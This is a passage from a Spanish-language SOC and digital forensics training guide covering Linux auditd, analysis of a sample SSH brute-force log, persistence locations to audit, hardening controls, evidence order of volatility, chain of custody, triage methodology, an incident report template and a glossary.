- `/var/log/syslog` o `/var/log/messages`: Logs generales del sistema.

### 12.2 Sistema de Auditoría de Kernel (auditd)

`auditd` es el subsistema oficial de auditoría de seguridad para Linux. Permite monitorear llamadas al sistema, accesos a archivos específicos y ejecución de comandos.

```bash
# Verificar el estado operativo de auditd
sudo auditctl -s

# Buscar eventos de ejecución de comandos por un usuario específico
sudo ausearch -m EXECVE -ts recent

# Generar un reporte de resumen de logins en el sistema
sudo aureport --login
```

### 12.3 Caso Práctico: Desglose de un Intento de Brute Force SSH

Al analizar `/var/log/auth.log`, un ataque de fuerza bruta presenta la siguiente firma:

```text
2026-10-20T14:10:01.123456-03:00 server1 sshd[1234]: Failed password for invalid user admin from 192.168.1.50 port 45210 ssh2
2026-10-20T14:10:02.890123-03:00 server1 sshd[1236]: Failed password for invalid user admin from 192.168.1.50 port 45212 ssh2
2026-10-20T14:10:04.456789-03:00 server1 sshd[1238]: Accepted password for root from 192.168.1.50 port 45214 ssh2
```

> **Análisis**
> 1. Se observan múltiples fallos de autenticación en intervalos de 1 a 2 segundos originados desde la IP `192.168.1.50`.
> 2. A las 14:10:04 se confirma un evento `Accepted password for root`.
> 3. **Conclusión:** Ataque de fuerza bruta o diccionarios **exitoso**. La cuenta `root` fue comprometida desde la IP interna `.50`. Se requiere aislamiento inmediato del servidor y revocación de credenciales.

---

## 13. Análisis de Mecanismos de Persistencia

La **Persistencia** consiste en cualquier técnica utilizada por un adversario para mantener su acceso a un sistema a través de reinicios o cortes de sesión.

```text
+-----------------------+----------------------------------+-----------------------------------------------+
| Plataforma            | Mecanismo de Persistencia        | Ubicación / Registro a Auditar                |
+-----------------------+----------------------------------+-----------------------------------------------+
| Windows               | Claves Run / RunOnce             | HKLM\Software\Microsoft\Windows\CurrentVersion\Run |
| Windows               | Servicios del Sistema            | Services Control Manager / Event ID 4697      |
| Windows               | Tareas Programadas               | `Get-ScheduledTask` / Event ID 4698           |
| Windows               | Carpetas Startup (Inicio)        | `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` |
+-----------------------+----------------------------------+-----------------------------------------------+
| Linux                 | Cron Jobs                        | `/etc/crontab`, `/var/spool/cron/crontabs/`   |
| Linux                 | Unidades systemd Timer           | `/etc/systemd/system/*.timer`                 |
| Linux                 | Archivos de Inicialización Shell | `~/.bashrc`, `~/.bash_profile`, `/etc/profile`|
| Linux                 | Claves SSH Autorizadas           | `~/.ssh/authorized_keys`                      |
+-----------------------+----------------------------------+-----------------------------------------------+
```

---

## 14. Hardening, Reducción de Superficie y Respuesta

El **Hardening (Endurecimiento)** comprende el conjunto de medidas preventivas para configurar los sistemas de forma segura, reduciendo las vías de entrada para un atacante.

### Matriz de Controles Preventivos vs. Detección vs. Respuesta

```text
+-------------------+------------------------------------+-------------------------------------+
| Fase              | Acciones en Windows                | Acciones en Linux                   |
+-------------------+------------------------------------+-------------------------------------+
| PREVENCIÓN        | - Deshabilitar PowerShell v2       | - Inhabilitar login root por SSH    |
| (Reducir Riesgo)  | - Configurar AppLocker / WDAC      | - Requerir autenticación por Clave |
|                   | - Habilitar LSA Protection (LSASS) | - Configurar UFW / nftables         |
+-------------------+------------------------------------+-------------------------------------+
| DETECCIÓN         | - Desplegar Sysmon con perfil modular| - Configurar auditd con reglas CIS  |
| (Ver la amenaza)  | - Centralizar Event Logs en SIEM   | - Implementar FIM (ej. Wazuh Agent) |
+-------------------+------------------------------------+-------------------------------------+
| RESPUESTA         | - Aislar host mediante EDR         | - Bloquear IP mediante Fail2ban     |
| (Contención)      | - Revocar Tokens y credenciales    | - Matar procesos (`kill -9`)        |
+-------------------+------------------------------------+-------------------------------------+
```

---

## 15. Fundamentos Forenses (DFIR) y Cadena de Custodia

### 15.1 Orden de Volatilidad (RFC 3227)

Al recolectar evidencias de un equipo comprometido, **siempre se deben recolectar primero los datos más volátiles** (aquellos que se pierden al apagar o reiniciar la máquina).

1. **Memoria RAM** y Registros de la CPU.
2. **Conexiones de red activas** y estado de sockets.
3. **Procesos en ejecución** y handlers abiertos.
4. **Almacenamiento secundario** (Archivos temporales, Disco duro local).
5. **Topología de red** y logs centralizados.
6. **Medios de respaldo archivados**.

### 15.2 Identificadores Criptográficos (Hashes)

Un Hash criptográfico (ej. SHA-256) transforma un archivo de cualquier tamaño en una cadena única de longitud fija. 

- Sirve para **verificar la integridad** de una prueba forense (demostrar que el archivo extraído no ha sido alterado ni un solo bit).
- Sirve para **cotejar en bases de datos de Inteligencia de Amenazas** (ej. VirusTotal) si el archivo es un malware conocido.

### 15.3 Registro de Cadena de Custodia

Todo archivo, muestra o artefacto extraído para un análisis posterior **debe ser registrado formalmente** para garantizar su validez legal y procesal.

```text
====================================================================
            REGISTRO OFICIAL DE CADENA DE CUSTODIA (DFIR)
====================================================================
ID de Caso:           INC-2026-1020-A
Fecha / Hora (UTC):   2026-10-20T18:30:00Z
Equipo Afectado:      SRV-DB-PROD01 (10.0.5.15)
Artefacto Extraído:   C:\Users\Public\payload.exe
Método de Extracción: Adquisición en vivo mediante script de Triage (PowerShell)
Hash SHA-256:         e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
Custodio Actual:      Analista SOC L1 - Juan Pérez
Ubicación Almacenada: Bóveda de Evidencias Cifrada / Case_INC-2026-1020/
====================================================================
```

### 15.4 Timestamps y Análisis MACB

En análisis forense de sistemas de archivos, los timestamps se agrupan bajo la sigla **MACB**:
- **M (Modified):** Fecha/hora en que el **contenido** del archivo fue modificado por última vez.
- **A (Accessed):** Fecha/hora en que el archivo fue leído o accedido.
- **C (Changed):** Fecha/hora en que la **metadata del inodo o MFT** (permisos, propietario) cambió.
- **B (Birth / Created):** Fecha/hora original de **creación** del archivo en el sistema de archivos actual.

---

## 16. Metodología de Triage SOC Paso a Paso

### 16.1 Flujo Operativo

```text
[ 1. Alerta Inicial ] ──► Recibir señal del SIEM / EDR
          │
          ▼
[ 2. Validación ]    ──► Descartar Falso Positivo. Comprobar regla y activo.
          │
          ▼
[ 3. Reconstrucción ]──► Crear Línea de Tiempo unificada en UTC (Eventos / Red / Procesos).
          │
          ▼
[ 4. Contextualización]► Contrastar con Baseline. ¿Es una tarea programada autorizada?
          │
          ▼
[ 5. Determinación ] ──► Classificar: ¿Verdadero Positivo?
          │
          ├──► NO  ──► Cerrar caso con justificación documentada.
          │
          └──► SÍ  ──► Ejecutar Plan de Contención Autorizado + Escalamiento IR.
```

### 16.2 Plantilla Profesional de Informe de Caso

```markdown
# Reporte de Incidente SOC — ID: [INC-YYYYMMDD-XX]

## 1. Resumen Ejecutivo
- **Estado:** [Confirmado / Falso Positivo / En Análisis]
- **Severidad:** [Crítica / Alta / Media / Baja]
- **Analista Responsable:** [Nombre y Apellido]
- **Fecha de Análisis (UTC):** [AAAA-MM-DD HH:MM UTC]
- **Sistemas / Activos Involucrados:** [Hostnames e IPs]

## 2. Descripción de los Hechos Observados
Breve explicación cronológica de lo que sucedió en el sistema sin modismos ni suposiciones no verificadas.

## 3. Línea de Tiempo de Investigaciones (UTC)
| Timestamp (UTC) | Origen (Fuente) | Evento Observado / Detalles Técnicos |
|---|---|---|
| 2026-10-20 14:00:01 | Security log (4624) | Login exitoso del usuario `jdoe` desde IP 192.168.1.10. |
| 2026-10-20 14:01:15 | Sysmon Event 1 | `powershell.exe` lanzado por `explorer.exe` ejecutando script Base64. |

## 4. Artefactos e Indicadores de Compromiso (IoCs)
- **Hashes (SHA-256):** `[Hash del ejecutable / script]`
- **IPs / Dominios Destino:** `[Direcciones externas observadas]`
- **Rutas de Archivos / Claves:** `[Ubicación exacta en disco o registro]`

## 5. Mapeo con Matriz MITRE ATT&CK
- **Táctica:** Execution [TA0002] — **Técnica:** Command and Scripting Interpreter: PowerShell [T1059.001]

## 6. Recomendaciones y Acciones de Contención
1. Aislar de la red la máquina `[Hostname]`.
2. Forzar el cambio de credenciales para el usuario `[Usuario]`.
3. Bloquear la IP externa `[IP]` en el Firewall perimetral.
```

### 16.3 Uso Correcto del Marco MITRE ATT&CK

La matriz **MITRE ATT&CK** es una base de conocimiento global sobre tácticas y técnicas de adversarios basadas en observaciones del mundo real.

> 🚨 **Cuidado metodológico:**  
> No mapees una técnica en un informe simplemente porque viste el nombre de un proceso. Por ejemplo: ver `powershell.exe` en ejecución no significa automáticamente que estés presenciando la técnica *T1059.001*. Debes **demostrar con la línea de comandos y el comportamiento** que se está usando para acciones no autorizadas.

---

## 17. Errores Comunes del Analista Junior

```text
+-------------------------------------------------+----------------------------------------------------+
| Error Frecuente                                 | Forma Correcta de Trabajar                         |
+-------------------------------------------------+----------------------------------------------------+
| "Encontré un Evento 4625: ¡Nos están atacando!" | Revisar el volumen y el contexto. Un par de fallos |
|                                                 | suelen ser un usuario equivocándose de contraseña. |
+-------------------------------------------------+----------------------------------------------------+
| "El proceso se llama 'svchost.exe', es seguro." | Verificar la ruta exacta del binario (`System32`) |
|                                                 | y cuál es su proceso padre (`services.exe`).       |
+-------------------------------------------------+----------------------------------------------------+
| "Apagué la máquina infectada inmediatamente."   | ¡Cuidado! Apagar el equipo destruye la memoria     |
|                                                 | RAM y la evidencia de conexiones de red activas.   |
+-------------------------------------------------+----------------------------------------------------+
| "El hash no aparece en VirusTotal, está limpio."| Un archivo malicioso nuevo o recompilado tendrá   |
|                                                 | un hash único desconocido por la comunidad.        |
+-------------------------------------------------+----------------------------------------------------+
```

---

## 18. Glosario y Fuentes Primarias

- **ACL:** Access Control List (Lista de Control de Acceso).
- **Auditd:** Subsistema de auditoría del kernel de Linux.
- **Baseline:** Comportamiento estándar o esperado de un sistema o red.
- **DFIR:** Digital Forensics and Incident Response (Forense Digital y Respuesta a Incidentes).
- **EDR:** Endpoint Detection and Response.
- **Event Log:** Registro estructurado de eventos en sistemas Windows.
- **FIM:** File Integrity Monitoring (Monitoreo de Integridad de Archivos).
- **MFT:** Master File Table (Tabla Maestra de Archivos en NTFS).
- **PoLP:** Principle of Least Privilege (Principio de Mínimo Privilegio).
- **SIEM:** Security Information and Event Management.
- **Sysmon:** System Monitor (Herramienta avanzada de telemetría de Windows).
- **Triage:** Clasificación, priorización y análisis sintomático de incidentes.

### Fuentes Primarias y Documentación Oficial
- [Microsoft Learn — Referencia Completa de Event IDs de Seguridad](https://learn.microsoft.com/en-us/windows/security/threat-protection/use-windows-event-logs-to-detect-threats)
- [Microsoft Sysinternals — Documentación Oficial de Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
- [systemd.index — Manual de Referencia de journalctl y systemd](https://www.freedesktop.org/software/systemd/man/latest/journalctl.html)
- [NIST SP 800-61 Rev. 2 — Computer Security Incident Handling Guide](https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final)
- [MITRE ATT&CK Enterprise Matrix](https://attack.mitre.org/)
- [RFC 3227 — Guidelines for Evidence Collection and Archiving](https://datatracker.ietf.org/doc/html/rfc3227)